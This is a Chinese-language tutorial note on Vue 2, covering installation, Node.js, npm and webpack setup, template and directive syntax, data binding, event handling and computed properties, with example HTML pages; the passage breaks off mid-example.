# VUE2

## 1.vue环境搭建

### 1.1.什么是vue

​	vue是一套用于**构建用户界面**的**渐进式**JavaScript框架。中文官网：https://cn.vuejs.org/

- 渐进式：vue可以自底向上逐层的应用。（引入轻量的核心库逐渐递进到各种各样的复杂库）

****

​	





vue由当时在谷歌工作的尤雨溪(Evan You)在2013年受AngularJS框架的启发，开发出了一款轻量框架---Seed，同年12月，Seed更名为vue，版本号为0.6.0.

- 2014年：vue正式对外发布，版本号为0.8.0，Taylor Otwell(PHP Laravel之父)在Twitter上发表动态，说自己正在学习vue；
- 2015年：10月27日，正式发布vue1.0.0 Evangelion（新世纪福音战士），同年，vue-touter,vuex,vue-cli相继发布，标志vue正式发展成一个渐进式框架；
- 2016年：10月1日，正式发布vue2.0.0 Ghost in the shell（攻壳机动队），它吸收了react的虚拟dom方案，还支持服务端渲染；
- 2019年：尤雨溪公布了3.0.0的源代码，当时还是Alpha版本；
- 2020年：9月18日，正式发布vue3.0.0（海贼王）。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627895.png" alt="image-20221220211924275" style="zoom:33%;" />



### 1.2.vue的特点

1. 采用组件化模式，提高代码复用率，让代码更好维护；

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627896.png" alt="image-20221220213555774" style="zoom:50%;" />



2.声明式编码，让编码人员无需操作DOM元素，提高开发效率；

3.使用虚拟DOM+Diff算法,尽量复用DOM结点.



### 1.3.搭建vue环境

#### 1.3.1.安装vue

可根据vue官方文档https://v2.cn.vuejs.	/v2/guide的`学习教程`参考安装搭建vue环境。

- 安装：安装版本有`开发版本`和`生产版本`，开发版本包含完整的警告和调试模式，而生产版本则删除了警告，是项目上线时的首选，这里我们两个都下载，以便进行对比。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627897.png" style="zoom: 33%;" />



- 创建工程`vue-basic`，并创建同级文件夹`js`，引入两个版本的`vue.js`和`vue.min.js`，创建文件`01-初识vue.html`，文件层级如下：

**<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627898.png" alt="image-20221222211626476" style="zoom:33%;" />**

- 通过`<script>`标签引入vue，然后再通过浏览器控制台打开查看到两个提示：

```html
<!-- 引入vue -->
<script src="../js/vue.js"></script>
```

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627899.png" style="zoom: 33%;" />



- 下载vue开发者工具：在`https://devtools.vuejs.org/guide/installation.html`中根据自己使用的浏览器进行vue开发者工具的下载，然后将其拖动到浏览器扩展中。如报错`Vue.js is not detected`可打开插件管理页，打开插件详情，将`允许访问文件网址`打开（参考：https://blog.csdn.net/qiaoyangla/article/details/122801903）。当引入开发者工具成功，刷新刚才的网页，第一条警告消失：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627900.png" alt="image-20221222214348425" style="zoom:33%;" />

- 另一条提示，我们也可以根据`学习`中的`api`的全局配置`https://v2.cn.vuejs.org/v2/api/`进行配置，将#productionTip属性值设置为false即可组织vue在启动时生成生产提示。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627901.png" style="zoom: 33%;" />

添加代码如下：

```html
<script type="text/javascript">
     // 设置为 false 以阻止 vue 在启动时生成生产提示
     Vue.config.productionTip = false;
</script>
```

刷新控制台发现提示消失。（有时候可能没有效果，我们可以直接到`vue.js`文件中找到`productionTip`，把值修改为false。）

- Hello World案例

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Document</title>
    <!-- 引入vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        总结：
            1.想让vue工作，就必须创建一个vue实例，且要传入一个配置对象；
            2.root容器里的代码依然复合html规范，只不过混入了一些vue语法，vue用{{}}去接收传递过来的值；
            3.root容器里的代码被称为【vue模板】。

     -->
    <!-- 准备一个容器 -->
    <div id="root">
        <h1>Hello World,{{name}}</h1>
    </div>
    <script type="text/javascript">
        // 设置为 false 以阻止 vue 在启动时生成生产提示
        Vue.config.productionTip = false;

        // 创建vue对象
        new Vue({
            // el用于指定当前vue实例为哪个容器服务，值通常为css选择器
            // 值也可用原生js方法：document.getElement...()的方式
            el: "#root",
            // data用于存储数据，数据供el所指定的容器使用，值暂时可写一个对象{}
            data: {
                name: "vue来的"
            }
        })
    </script>
</body>
</html>
```



- 如果容器和vue对象是一对多、多对多是不行的，这两个对象只能一对一，以下两端代码都是不正确的处理方式：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Document</title>
    <!-- 引入vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        总结：
            1.想让vue工作，就必须创建一个vue实例，且要传入一个配置对象；
            2.root容器里的代码依然复合html规范，只不过混入了一些vue语法，vue用{{}}去接收传递过来的值；
            3.root容器里的代码被称为【vue模板】。

     -->
    <!-- 准备一个容器 -->
    <div id="root">
        <h1>Hello World,{{name}}</h1>
    </div>
    
    <div id="root">
        <h1>Hello World,{{name}}</h1>
    </div>
    <script type="text/javascript">
        // 设置为 false 以阻止 vue 在启动时生成生产提示
        Vue.config.productionTip = false;

        // 创建vue对象
        new Vue({
            // el用于指定当前vue实例为哪个容器服务，值通常为css选择器
            // 值也可用原生js方法：document.getElement...()的方式
            el: "#root",
            // data用于存储数据，数据供el所指定的容器使用，值暂时可写一个对象{}
            data: {
                name: "vue来的"
            }
        })
    </script>
</body>
</html>
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Document</title>
    <!-- 引入vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        总结：
            1.想让vue工作，就必须创建一个vue实例，且要传入一个配置对象；
            2.root容器里的代码依然复合html规范，只不过混入了一些vue语法，vue用{{}}去接收传递过来的值；
            3.root容器里的代码被称为【vue模板】。

     -->
    <!-- 准备一个容器 -->
    <div id="root">
        <h1>Hello World,{{name}}，{{sex}}</h1>
    </div>
    <!-- <div id="root">
        <h1>Hello World,{{name}}</h1>
    </div> -->
    <script type="text/javascript">
        // 设置为 false 以阻止 vue 在启动时生成生产提示
        Vue.config.productionTip = false;

        // 创建vue对象
        new Vue({
            // el用于指定当前vue实例为哪个容器服务，值通常为css选择器
            // 值也可用原生js方法：document.getElement...()的方式
            el: "#root",
            // data用于存储数据，数据供el所指定的容器使用，值暂时可写一个对象{}
            data: {
                name: "vue来的"
            }
        })

        // 创建vue对象
        new Vue({
            // el用于指定当前vue实例为哪个容器服务，值通常为css选择器
            // 值也可用原生js方法：document.getElement...()的方式
            el: "#root",
            // data用于存储数据，数据供el所指定的容器使用，值暂时可写一个对象{}
            data: {
                sex: "vue性别是什么？"
            }
        })
    </script>
</body>
</html>
```



- {{xxx}}中的xxx要学js表达式，而不能是代码块，以及Vue对象是一个构造函数对象，必须通过new的方式进行创建，以下为相关注意事项：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Document</title>
    <!-- 引入vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        总结：
            1.想让vue工作，就必须创建一个vue实例，且要传入一个配置对象；
            2.root容器里的代码依然复合html规范，只不过混入了一些vue语法，vue用{{}}去接收传递过来的值；
            3.root容器里的代码被称为【vue模板】；
            4.Vue实例和容器是一一对应的；
            5.真实开发中只有一个Vue实例，并且只会配合着组件一起使用；
            6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
            7.一旦data中的数据发生改变，那么模板中用到该数据的地方也会自动更新。


            注意区分：js表达式和js代码（语句）
                1.表达式：一个表达式可以返回一个值，可以放在任何一个需要值的地方：
                    （1）.a
                    （2）.a+b
                    （3）.demo(1)
                    （4）.x===y ? "a" : "b"
                2.js代码：
                    （1）.if(){}
                    （2）.for(){}
                     ...

     -->
    <!-- 准备一个容器 -->
    <div id="root">
        <h1>Hello World,{{name}}，{{sex}},{{Date.now()}}</h1>
    </div>

    <script type="text/javascript">
        // 设置为 false 以阻止 vue 在启动时生成生产提示
        Vue.config.productionTip = false;
        // 解决开发者工具的问题：Vue.js is detected on this page
        Vue.config.devtools = true


        // 创建vue对象
        new Vue({
            // el用于指定当前vue实例为哪个容器服务，值通常为css选择器
            // 值也可用原生js方法：document.getElement...()的方式
            el: "#root",
            // data用于存储数据，数据供el所指定的容器使用，值暂时可写一个对象{}
            data: {
                name: "vue来的"
            }
        })
        
    </script>
</body>
</html>
```



#### 1.3.2.Node.js环境

​	Node.js是一个基于chrome V8引擎的**JavaScript运行环境**。它可以让JavaScript运行在服务器端。node官网为：`http://nodejs.p2hp.com/`。

​	为什么使用node？作为一个程序员写完代码直接就可以运行了，但是用户并没有办法执行源码，所以我们需要用node将项目暴露出去，然后用户就可以通过浏览器访问项目了。这一交给node管理的过程，我们称之为项目部署/项目发布。

![image-20230222150927308](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221509436.png)

![](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221456805.png)

​	下载后进行安装，直接默认“下一步”就行了。安装完成后可以在命令行输入如下命令，检测是否安装好：

```shell
node -v
```

![image-20230222145824856](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221458968.png)

通过node编写`Hello World!`案例：

1.在VSCode上编写`HelloWorld.js`文件:

```javascript
console.log("HelloWorld!");
```

2.在文件所在目录进入`cmd`命令执行如下命令：

```shell
node HelloWorld.js
```

![image-20230222150418371](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221504476.png)

3.node可以产生一个交互式环境REPL(Read-Eval-Print Loop:读取-求值-输出 循环)，相当于浏览器的控制台，输入以下命令测试：

```shell
node
console.log("HelloWorld!")
```

![image-20230222150841498](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221508614.png)

环境配置：cmd运行

```shell
npm config set prefix "D:\Software\nodejs\node_global"

npm config set cache "D:\Software\nodejs\node_cache"
```

配置环境变量：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221551590.png" style="zoom:33%;" />

在 系统变量 中 选择 Path 添加如下属性:

```shell
D:\Software\nodejs  				npm命令

D:\Software\nodejs\node_global		vue命令
```

![image-20230222155425285](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221554397.png)

测试：全局安装express模块：

```shell
npm install express -g
```

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221610415.png" alt="image-20230222161037246" style="zoom:33%;" />

如安装不成功，可以参照以下步骤：

```text
1.删除C:\Users{账户}\下的.npmrc 文件

2.清除npm缓存：npm cache clean --force

3.再运行npm install命令即可
```



#### 1.3.3.npm包管理工具

​	npm是Node.js Package Manager的简称，用来解决Node.js代码部署的问题。使用场景需求：

- 从npm服务器下载别人编写的第三方库到本地使用；
- 从npm服务器下载并安装别人编写的命令程序到本地使用；
- 将自己编写的包或命令行程序上传到npm服务器供别人使用。

​	npm官方文档：https://www.npmjs.cn/

​	npm快速入门：https://www.npmjs.cn/getting-started/installing-node/

​	nmp常用命令：

1. `npm install`：安装项目所需的全部包，需要配置package,json文件

2. `npm install 包名`：安装指定名称的包

3. `npm uninstall 包名`：卸载指定的包

4. `npm update 包名`：更新指定包

5. `npm start`：项目启动

6. `npm run build`：项目构建

   **npm默认服务器为海外的服务器，需配置npm服务器为淘宝：``npm config set registry https://registry.npm.taobao.org``**



#### 1.3.4.webpack打包工具

​	webpack是一个模块打包工具，可以把前端项目中的js、css、scss/less、图片等文件打包在一起，实现自动化构建，给前端开发人员带来极大的便利。

官网：https://www.webpackjs.com/

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302281725736.png" alt="image-20230222153905413" style="zoom:50%;" />

为啥要打包？在模块化开发中，我们会编写大量的模块，如果不打包进行上线，那么页面的加载和交互将会产生大量的请求，从而影响性能。

- **全局安装webpack**：`npm install webpack webpack-cli -g --registry=https://registry.npm.taobao.org`
- **查看webpack版本：`**webpack -v`
- **卸载webpack:`**npm uninstall webpack webpack-cli -g`
- ![image-20230222164811273](https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302221648466.png)

**webpack简单使用：**

1.创建`example.js`文件：

```javascript
function add(a,b) {
    return a+b
}

console.log(add(3,4));
```

2.在文件所在的目录用webpack打包`example.js`文件到`app.js`：

```shell
webpack example.js -o app.js
```

如不允许使用打包请参考:https://blog.csdn.net/weixin_45597064/article/details/119617447



3.新建`index.html`引入`app.js`：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Document</title>
    <script src="./app.js/main.js"></script>
</head>
<body>
    
</body>
</html>
```

4.浏览器查看：

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202312132253960.png" alt="image-20230222172736605" style="zoom:33%;" />

## 2.Vue基础

### 2.1.模板语法

​	之前我们所学习到的{{xxx}}是模板语法中的一种---**插值语法**，它能实现的功能比较单一，只能将指定的值放到指定的地方。还有一种就是---**指令语法**，它可以用于解析标签（包括：标签属性、标签体内容、绑定事件等。）我们分别来了解下这两种模板语法。

#### 2.1.1.插值语法

```javascript
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 准备一个容器 -->
    <div id="root">
        <h1>插值语法</h1>
        <h3>
            你好，{{name}}
        </h3>
    </div>

    <script>
        Vue.config.productionTip = false; // 阻止vue在启动时生成生产提示

        new Vue({
            el: '#root',
            data: {
                name: "邹堂瑞"
            }
        })
    </script>
</body>
</html>
```

#### 2.1.2.指令语法

​	指令语法可以使用冒号或v-bind来进行绑定（实际冒号:就是v-bind的简写形式）。

```javascript
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        Vue模板语法有2大类：
					1.插值语法：
							功能：用于解析标签体内容。
							写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
					2.指令语法：
							功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
							举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
									 且可以直接读取到data中的所有属性。
							备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。
     -->
    <!-- 准备一个容器 -->
    <div id="root">
        <h1>插值语法</h1>
        <h3>
            你好，{{name}}
        </h3>

        
        <h1>指令语法</h1>
        <!-- v-bind作为绑定的一种指令语法的方式 -->
        <a v-bind:href="url">点我百度一下，你就学会vue了</a>
        <!-- v-bind可以简写成:的形式 -->
        <a :href="url">点我百度一下，你学得会vue吗？</a>
    </div>

    <script>
        Vue.config.productionTip = false; // 阻止vue在启动时生成生产提示

        new Vue({
            el: '#root',
            data: {
                name: "邹堂瑞",
                url: 'https://www.baidu.com'
            }
        })
	</script>
</body>
</html>
```

**总结：**

```txt
Vue模板语法有2大类：
					1.插值语法：
							功能：用于解析标签体内容。
							写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
					2.指令语法：
							功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
							举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
									 且可以直接读取到data中的所有属性。
							备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。
```

### 2.2.数据绑定

​	之前我们所用到的`v-bind`只能实现从data流向页面的单向绑定，我们在页面准备input输入框，用`v-bind`传递`name`属性过来，我们发现从vue插件流向输入框是可以的，但从输入框输入的值无法改变vue插件中的值。如果想要实现双向绑定，vue也给我们提供了`v-model`，它不仅能从data流向页面，还可以从页面流向data。

​	但需要注意的是：虽然`v-model`功能更加强大，能实现双向绑定，但它实现的场景只能是**表单类元素（输入类元素）**上（如：input，select等）。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627902.png" alt="image-20230108191833553" style="zoom:33%;" />

```javascript
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>数据绑定</title>
    <!-- 引入vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- 
        总结：
        vue有两种绑定的方式：
            1.单向绑定(v-bind)：数据只能从data流向页面。
					2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
						备注：
								1.双向绑定一般都应用在表单类元素上（如：input、select等）
								2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
     -->
    <!-- 准备一个容器 -->
    <div id="root">
        <!-- 常规写法 -->
        单向绑定：<input type="text" v-bind:value="name"><br>
        双向绑定：<input type="text" v-model:value="name"><br>
        <!-- v-model:value 可以简写为 v-model -->
        单向绑定：<input type="text" :value="name"><br>
        双向绑定：<input type="text" v-model="name"><br>
        <!-- 使用v-bind能实现数据传递 -->
        <h2 v-bind:value="name">你好啊！！！</h2>
        <!-- 使用v-model不能实现数据传递 -->
        <h2 v-model:value="name">你好啊！！！</h2>
    </div>

    <script>
        // 设置为 false 以阻止 vue 在启动时生成生产提示
        Vue.config.productionTip = false;
        // 解决开发者工具的问题：Vue.js is detected on this page
        Vue.config.devtools = true;
        new Vue({
            el: "#root",
            data: {
                name: "邹堂瑞"
            }
        })
    </script>
</body>
</html>
```

**总结：**

```txt
1.语法：v-bind:href ="xxx" 或简写为 :href
	特点：数据只能从 data 流向页面
2.语法：v-model:value="xxx" 或简写为 v-model="xxx"
	特点：数据不仅能从 data 流向页面，还能从页面流向 data
```



### 2.3.el和data

​	之前我们需要通过`new Vue()`的方式创建Vue实例，但这种写法太过于麻烦，我们可以创建代码片段，快捷生成要创建的Vue实例。

​	el属性我们之前已经用过了，它指定哪个容器使用当前的Vue实例，但这种方式不太灵活，我们可以将创建的Vue实例返回一个对象，我们打印这个对象可以发现，这个对象有很多的方法属性，有`$`的大都是开发人员能使用的，其他的就属于Vue实例自己使用，而一部分方法则在原型对象`prototype`。我们可以使用原型对象中的`$mount`来取代`el`属性，以增加代码的灵活性。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627903.png" alt="image-20230108204121164" style="zoom:33%;" />

​	而`data`也有两种写法：第一种是我们之前用到的`对象式`，还有一种是`函数式`。需要注意的是函数式必须有返回值，我们以后用到组件时，必须使用`函数式`，否则会报错。

```javasctipt
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
   
    <!-- 准备一个容器 -->
    <div id="root">
        <h1>你好,{{name}}</h1>
    </div>

    <script>
        // 设置为 false 以阻止 vue 在启动时生成生产提示
        Vue.config.productionTip = false;
        // 创建Vue对象
        // el的两种写法
        // const v = new Vue({
        //     // el属性第一种写法
        //     // el: "#root",
        //     data: {
        //         name: "Micheal"
        //         }
        // });
        // console.log(v);
        // // 第二种写法，mount就是将解析的内容‘挂载’到页面中
        // v.$mount('#root');
        
        // data的两种写法
        new Vue({
            el: "#root",
            // data的第一种写法：对象式
            // data: {
            //     name: ""
            //     }
            // data的第二种写法：函数式
            // 如下方式也可以简写为data(){...}
            data: function() {
                console.log("===",this); // 此处的this是Vue实例对象
                return{
                    name: "Micheal"
                }
            }
        })
    </script>
</body>
</html>
```

**总结：**

```txt
data与el的2种写法
			1.el有2种写法
							(1).new Vue时候配置el属性。
							(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
			2.data有2种写法
							(1).对象式
							(2).函数式
							如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
			3.一个重要的原则：
							由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。
```

### 2.4.事件处理

​	Vue中的事件处理是一个非常重要的技术点，因为用户操作页面通常是通过例如点击事件、键盘事件等事件来操作的。

#### 2.4.1.事件的基本处理

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <!-- 引入vue -->
    <script src="../js/vue.js"></script>
</head>
<body>
    
    <div id="root">
        <h3>
            欢迎来到{{name}}
        </h3>
        <!-- <button v-on:click='showInfo'>点我弹出同学你好</button> -->
        <!-- 以上方式可以简写成下面格式，用@替代v-on: -->
        <button @click='showInfo01'>点我弹出同学你好</button>
        <!-- $event是vue保留event，66是传递的参数 -->
        <button @click='showInfo02($event,666)'>点我接收参数666</button>
    </div>

    <script>
        new Vue({
            el: "#root",
            data: {
                name: "四川城院"
                },
            methods: {
                // event是一个事件对象，比如点击事件，它有一些属性如target-发生事件的目标
                showInfo01(event) {
                    // console.log(event.target.innerText);
                    // 此处this表示vm对象
                    // console.log(this);
                    alert('同学你好！！！');
                },
                showInfo02(event,number) {
                    // console.log(event.target.innerText);
                    // 此处this表示vm对象
                    // console.log(this);
                    alert(number);
                }
            }
        })
    </script>
</body>
</html>
```

**总结：**

```txt
事件的基本使用：
	1.使用`v-on:xxx` 或` @xxx` 绑定事件，其中xxx是事件名；
	2.事件的回调需要配置在`methods`对象中，最终会在vm上；
	3.`methods`中配置的函数，不要用箭头函数！否则`this`就不是vm了；
	4.`method`中配置的函数，都是被Vue所管理的函数，`this`的指向是vm 或 组件实例对象；
	5.`@click="demo"` 和` @click="demo($event)"` 效果一致，但后者可以传参.
```

#### 2.4.2.事件修饰符  

​	事件修饰符表示对事件的阻止、触发和捕获等操作。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
    <style>
        * {
                margin-top: 20px;
        }

        .demo01 {
                height: 50px;
                background-color: red;
        }
        .box1{
		padding: 5px;
		background-color: skyblue;
	}
	.box2{
		padding: 5px;
		background-color: orange;
	}
	.list{
	        width: 200px;
		height: 200px;
		background-color: peru;
		overflow: auto;
	}
	li{
		height: 100px;
	}
    </style>
</head>
<body>
       
        <!-- 准备一个容器 -->
        <div id='root'>
                <h3>欢迎来到{{name}}学习</h3>
                <!-- prevent相当于preventDefault()，阻止事件 -->
                <a href="https://www.baidu.com" @click.prevent="showInfo">点击弹出你好</a>
                <!-- stop：阻止事件冒泡（常用） -->
                <div class="demo01" @click="showInfo">
                        <button @click.stop="showInfo">点击弹出同学你好！</button>
                </div>
                <!-- once：事件只触发一次（常用） -->
                <button @click.once="showInfo">点击弹出同学你好！</button>
                <!-- capture：使用事件的捕获模式
                        点击box1输出1，box2输出2，如果不使用capture
                        点击box2输出21，加了capture输出12
                -->
                <div class="box1" @click.capture="showMsg(1)">
                        div01
                        <div class="box2" @click="showMsg(2)">
                                div02
                        </div>
                </div>
                <!-- self：只有event.target是当前操作的元素时才触发事件 -->
                <div class="demo01" @click.self="showInfo">
                        <button @click="showInfo">点击弹出同学你好！</button>
                </div>
                <!-- passive：事件的默认行为立即执行，无需等待事件回调执行完毕 
                        scroll是滚动条滚动事件
                        wheel是鼠标滚轮滚动事件
                -->
                <ul class="list" @wheel.passive="showList">
                        <li>1</li>
                        <li>2</li>
                        <li>3</li>
                        <li>4</li>
                </ul>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                                name:'四川城市职业学院'
                        },
                        methods: {
                                showInfo(e) {
                                        // e.preventDefault()表示不要执行与事件关联的默认动作
                                        // e.preventDefault();
                                        // e.stopPropagation()表示阻止事件冒泡执行
                                        // e.stopPropagation();
                                        alert('同学你好！！！');
                                        // console.log(e.target);
                                },
                                showMsg(msg) {
                                        console.log(msg);
                                },
                                showList() {
                                        // console.log('==');
                                        for (let i = 0; i < 100000; i++) {
                                                console.log('#');;       
                                        }
                                        console.log('终于结束了！');
                                }
                        }
                        
                })
        </script>
</body>
</html>
```

**总结：**

```txt
Vue中的事件修饰符：
	1.prevent：阻止默认事件（常用）；
	2.stop：阻止事件冒泡（常用）；
	3.once：事件只触发一次（常用）；
	4.capture：使用事件的捕获模式；
	5.self：只有event.target是当前操作的元素时才触发事件；
	6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；
```

#### 2.4.3.键盘事件

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            <h3>欢迎来到{{name}}学习</h3>
            <!-- 
                keydown事件是按下未抬起时的操作
                keyup事件是抬起来时的操作-常用
                enter键盘事件别名表示按下回车才执行，如果没有，在输入框
                没输入一个字符就会输出
             -->
            <input type="text" placeholder="按下回车提示输入" @keyup.huiche="showInfo">
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                Vue.config.keyCodes.huiche = 13 //定义了一个回车别名按键
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            name: '四川城市职业学院'
                        },
                        methods: {
                            showInfo(e) {
                                // e.target.value获取输入框的内容
                                // e.keyCode表示输出键盘的字符编码,e.key表示键盘的键名
                                console.log(e.key,e.keyCode);
                                // if(e.keyCode !==13) return
                                console.log(e.target.value);
                            }
                        }
                        
                })
        </script>
</body>
</html>
```

**总结：**

```txt
1.Vue中常用的按键别名：
	回车 => enter
	删除 => delete (捕获“删除”和“退格”键)
	退出 => esc
	空格 => space
	换行 => tab (特殊，必须配合keydown去使用)
	上 => up
	下 => down
	左 => left
	右 => right

注意：
	Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
系统修饰键（用法特殊）：ctrl、alt、shift、meta
	(1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
	(2).配合keydown使用：正常触发事件。
	也可以使用keyCode去指定具体的按键（不推荐）
	Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
```



### 2.5.计算属性

​	计算属性就是拿着已有的属性去加工和计算，变成一个全新的属性。

​	要想了解计算属性，我们现通过以下案例来观察：在第一个输入框中动态接收姓，第二个输入框中动态接收名，然后用`-`分隔进行显示。常用的有两种实现的方式：①插值语法；②methods方法。

<img src="https://gitee.com/zou_tangrui/note-pic/raw/master/img/202302171627908.png" alt="image-20230115195526767" style="zoom:33%;" />

#### 2.5.1.插值语法实现

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            姓: <input type="text" v-model="firstName"><br/><br/>
            名：<input type="text" v-model="lastName"><br/><br/>
            <!-- 姓名：<span>{{firstName + '-' + lastName}}</span> -->
            <!-- slice(0,3)表示截取包括下标0，不包括下标3 -->
            姓名：<span>{{firstName.slice(0,3)}} - {{lastName}}</span>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            firstName: '张',
                            lastName: '三'
                        }
                        
                })
        </script>
</body>
</html>
```

#### 2.5.2.methods实现

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            姓: <input type="text" v-model="firstName"><br/><br/>
            名：<input type="text" v-model="lastName"><br/><br/>
            姓名：<span>{{fullName()}}</span>
        </div>
        <script>
                // 设置为 false 以阻止 vue 在启动时生成生产提示
                Vue.config.productionTip = false;
                // 创建Vue对象
                new Vue({
                        el: '#root',
                        data: {
                            firstName: '张',
                            lastName: '三'
                        },
                        methods: {
                            fullName() {
                                console.log('=='); // 修改一次执行一次
                                return this.firstName + '-' + this.lastName;
                            }
                        }
                        
                })
        </script>
</body>
</html>
```

#### 2.5.3.计算属性实现

​	除此之外，最常用是用**计算属性**来实现。计算属性通过vm对象的`computed`属性来实现，`computed`里配置的就是你要返回的通过计算得到的返回结果，但如果要获取或修改这个结果，还需要使用`get()`方法和`set()`方法来实现。

```vue
<!DOCTYPE html>
<html lang='en'>
<head>
    <meta charset='UTF-8'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>vue使用模板</title>
    <!-- 引入vue -->
    <script src='../js/vue.js'></script>
</head>
<body>
        <!-- 准备一个容器 -->
        <div id='root'>
            姓: <input type="text" v-model="firstName"><br/><br/>
            名：<input type="text" v-model="lastName"><br/><br/>
            <!-- 此处虽然有多个fullName，但get只被调用一次，因为当第一次读取fullName时会保存缓存 -->
            姓名：<span>{{fullName}}</span> <br/><br/>
            姓名：<span>{{fullName}}</span> <br/><br/>
            姓名：<span>{{fullName}}</span> <br/><br/>
            姓名：<span>{{fullName}}</span>
        </div>
